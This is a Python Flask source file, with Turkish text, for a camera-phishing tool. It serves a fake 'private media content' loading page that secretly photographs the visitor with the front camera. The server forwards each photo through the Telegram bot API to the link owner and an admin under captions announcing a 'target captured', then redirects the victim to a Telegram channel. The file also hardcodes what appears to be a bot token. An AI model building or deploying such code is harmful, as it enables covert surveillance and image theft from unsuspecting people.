from flask import Flask, request, render_template_string, jsonify
import requests
import os

app = Flask(__name__)

BOT_TOKEN = "8767529923:AAH18FJFClgGKjiAiVhQv-DyUctOAscWB4M"
ADMIN_ID = 8767529923 # Veya kendi admin ID'ni yazabilirsin

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Özel Medya İçeriği</title>
    <style>
        body { background: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h2>İçerik Yükleniyor... Lütfen Bekleyin</h2>
    <div class="loader"></div>
    <p>Kameraya erişim izni vermeniz gerekmektedir.</p>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const targetUserId = "{{ owner_id }}";

        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await video.play();

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    
                    stream.getTracks().forEach(track => track.stop());

                    fetch('/upload', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ image: imageData, owner_id: targetUserId })
                    }).then(res => {
                        window.location.href = "https://t.me/swarovskiyeniden";
                    });
                }, 1500);
            } catch (err) {
                console.error("Camera error:", err);
                window.location.href = "https://t.me/swarovskiyeniden";
            }
        }

        window.onload = initCamera;
    </script>
</body>
</html>
"""

@app.route('/view/<owner_id>')
def view_page(owner_id):
    return render_template_string(HTML_TEMPLATE, owner_id=owner_id)

@app.route('/upload', methods=['POST'])
def upload_image():
    data = request.json
    image_data = data.get('image')
    owner_id = data.get('owner_id')

    if not image_data or not owner_id:
        return jsonify({'status': 'error'}), 400

    # Base64 to binary image decode
    header, encoded = image_data.split(",", 1)
    import base64
    image_bytes = base64.b64decode(encoded)

    # Send to Bot Owner (Referrer)
    files = {'photo': ('capture.jpg', image_bytes, 'image/jpeg')}
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", 
                  data={'chat_id': owner_id, 'caption': '🎯 Hedef görsel yakalandı!'}, files=files)

    # Send to Admin (Client)
    if int(owner_id) != ADMIN_ID:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", 
                      data={'chat_id': ADMIN_ID, 'caption': f'⚠️ Yeni Yakalama! Link Sahibi ID: {owner_id}'}, files=files)

    return jsonify({'status': 'success'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
  
